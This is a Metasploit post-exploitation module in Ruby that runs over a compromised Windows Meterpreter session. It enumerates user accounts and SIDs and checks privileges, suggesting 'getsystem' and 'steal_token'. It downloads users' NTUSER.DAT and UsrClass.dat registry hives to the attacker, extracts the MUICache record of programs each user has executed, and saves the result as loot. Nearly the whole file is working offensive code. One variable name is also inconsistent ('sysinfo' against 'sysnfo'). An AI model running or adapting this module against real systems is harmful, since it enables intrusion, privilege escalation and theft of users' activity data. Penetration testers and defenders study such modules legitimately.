##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex'
require 'msf/core'
require 'rex/registry'
require 'rex/post/file'
require 'msf/core/post/file'
require 'msf/core/post/windows/registry'
require 'rex/post/meterpreter/extensions/stdapi/fs/file.rb'

class Metasploit3 < Msf::Post
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry

	def initialize(info={})
		super(update_info(info,
			'Name'          =>      'Windows Gather Enum User MUICache',
			'Description'   =>
				%q{
					This module gathers information about the files and filepaths that logged on users
					have executed on the system. This information is gathered from the registry.
					},
			'License'       =>      MSF_LICENSE,
			'Author'        =>      ['TJ Glad <fraktaali[at]gmail.com>'],
			'Platform'      =>      ['win'],
			'SessionType'   =>      ['meterpreter']
										 ))
	end

	def find_usernames()
		# Function scrapes usernames, users home path and users sid from
		# registry using ProfileImagePath registry key. This is not 100%
		# accurate if the username has been changed but most of the time
		# the found username matches with the actual user.
		usernames = []
		user_sids = []
		home_paths = []
		username_reg_path = "HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList"
		profile_subkeys = registry_enumkeys(username_reg_path)
		if profile_subkeys.nil? or profile_subkeys.empty?
			print_error("Unable to access ProfileList. Can't continue.")
			return nil
		else
			profile_subkeys.each do |user_sid|
				if user_sid.length > 10 and not user_sid.nil?
					user_home_path = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList\\#{user_sid}", "ProfileImagePath")
					usernames << user_home_path.delete("\00").split("\\")[-1]
					home_paths << user_home_path.delete("\00")
					user_sids << user_sid.delete("\00")
				end
			end
		end
		return usernames, user_sids, home_paths
	end

	 def enum_muicache_reg_keys(sys_sids, mui_path)
		 # This builds full muicache paths using collected user_sids
		 user_mui_paths =[]
		 hive = "HKU\\"
		 sys_sids.each do |sid|
			 full_paths = hive + sid + mui_path
			 user_mui_paths << full_paths
		 end
		 return user_mui_paths
	 end

	 def enumerate_muicache(muicache_reg_keys, sys_users, home_paths, table, sysnfo)
		 all_user_entries = sys_users.zip(muicache_reg_keys, home_paths)
		 all_user_entries.each do |user, reg_key, home_path|
			 subkeys = registry_enumvals(reg_key)
			 if subkeys.nil?
				 print_error("User #{user}: Can't access registry (maybe the user is not logged in?). Trying NTUSER.DAT/USRCLASS.DAT..")
				 # This will build the hive filepaths and check if the hive file
				 # exists.
				 loot_path = Msf::Config::loot_directory
				 sys_file = ::File.join(loot_path, "#{sysinfo['Computer']}_#{user}_HIVE_#{::Time.now.utc.strftime('%Y%m%d.%M%S')}")
				 if sysnfo =~/(Windows XP)/
					 muicache = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
					 user_home_path = expand_path(home_path)
					 ntuser_path = user_home_path + "\\NTUSER.DAT"
					 ntuser_dat = client.fs.file.exists?(ntuser_path)
					 if ntuser_dat == true
						 print_status("Downloading #{user}'s NTUSER.DAT file..")
						 hive_path = ntuser_path
						 hive_status = hive_download_status(sys_file, hive_path)
						 if hive_status == true
							 query_registry_hive(user, table, sys_file, muicache)
							 File.delete(sys_file)
						 else
							 print_status("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
							 File.delete(sys_file)
							 return nil
						 end
					 end
				 elsif
					 sysnfo =~/(Windows 7)/
					 muicache = "\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache"
					 user_home_path = expand_path(home_path)
					 usrclass_path = user_home_path + "\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat"
					 usrclass_dat = client.fs.file.exists?(usrclass_path)
					 if usrclass_dat == true
						 hive_path = usrclass_path
						 hive_status = hive_download_status(sys_file, hive_path)
						 if hive_status == true
							 query_registry_hive(user, table, sys_file, muicache)
							 File.delete(sys_file)
							 else
								 print_status("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
								 File.delete(sys_file)
								 return nil
							 end
					 end
				 end
			 else
				 print_status("User #{user}: Enumerating users registry..")
				 subkeys.each do |key|
					 if key[0] != "@" and key != "LangID"
						 check_file_exists(key, user, table)
					 end
				 end

			 end
		 end
	 end

	 def hive_download_status(sys_file, hive_path)
		 # This downloads registry hives and checks for integrity after the
		 # transfer has completed.
		 hive_status = false
		 3.times do
			 remote_hive_hash_raw = client.fs.file.md5(hive_path)
			 remote_hive_hash = remote_hive_hash_raw.unpack('H*')
			 session.fs.file.download_file(sys_file, hive_path)
			 local_hive_hash = file_local_digestmd5(sys_file)
			 if local_hive_hash == remote_hive_hash[0]
				 print_good("Hive downloaded successfully!")
				 hive_status = true
				 break
			 else
				 print_error("Hive download corrupted. Trying again..")
				 File.delete(sys_file)
				 hive_status = false
			 end
		 end
		 return hive_status
	 end

	 def query_registry_hive(user, table, sys_file, muicache)
		 hive = Rex::Registry::Hive.new(sys_file)
		 if hive.nil?
			 print_error("Unable to query the registry hive. Can't continue. :(")
		 else
			 muicache_key = hive.relative_query(muicache)
			 if muicache_key.nil?
				 print_error("Error reading hive valuekeys. :(")
			 else
				 muicache_key_value_list = muicache_key.value_list
				 if muicache_key_value_list.nil?
					 print_error("Error reading hive valuelist. :(")
				 else
					 muicache_key_values = muicache_key_value_list.values
					 if muicache_key_values.nil?
						 print_error("Error reading hive values :(")
					 else
						 muicache_key_values.each do |value|
							 key = value.name
							 if key[0] != "@" and key != "LangID" and not key.nil? and not key.empty?
								 check_file_exists(key, user, table)
							 end
						 end
					 end
				 end
			 end
		 end
	 end

	 def check_file_exists(key, user, table)
		 program_path = expand_path(key)
		 program_exist = file_exist?(key)
		 if program_exist == true
			 exists = "File found"
		 else
			 exists = "File not found"
		 end
		 table << [user, program_path, exists]
	 end

	def run

		print_good("Starting MUICache enumeration..")
		sysnfo = client.sys.config.sysinfo['OS']
		if sysnfo =~/(Windows XP)/
			mui_path = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
			if not is_admin?
				print_error("Not enough privileges. Try getsystem.")
				return nil
			elsif is_system?
				print_good("Supported: #{sysnfo}")
				print_status("When running as SYSTEM you might get false negatives (*hint* steal_token) with files located at Network Drives.")
			else
				print_good("Supported: #{sysnfo}")
			end
		elsif sysnfo =~/(Windows 7)/
			if not is_admin?
				print_error("Not enough privileges. Try getsystem.")
			else
				print_good("Supported: #{sysnfo}")
				mui_path = "_Classes\\Local\ Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache"
			end
		else
			print_error("Unsupported: #{sysnfo}")
			print_error("Currently works only on WinXP and Win7.")
			return nil
		end

		table = Rex::Ui::Text::Table.new(
			'Header'  => "MUICache Information",
			'Indent'  => 1,
			'Columns' =>
			[
				"Username",
				"File path",
				"File exists?",
			])

		# This gets usernames and prints them to screen
		sys_users, sys_sids, home_paths = find_usernames()
		if not sys_users.empty?
			sys_users.each do |user|
				print_status("Found user: #{user}")
			end
		end

		print_status("Next: Registry Hive.")
		muicache_reg_keys = enum_muicache_reg_keys(sys_sids, mui_path)
		enumerate_muicache(muicache_reg_keys, sys_users, home_paths, table, sysnfo)
		print_status("Collection finished. Printing results.")

		# Stores and prints out results
		results = table.to_s
		loot = store_loot("muicache_info", "text/plain", session, results, nil, "MUICache Information")
		print_line("\n" + results + "\n")
		print_status("Results stored in: #{loot}")
		print_good("Executed successfully!")
	end
end
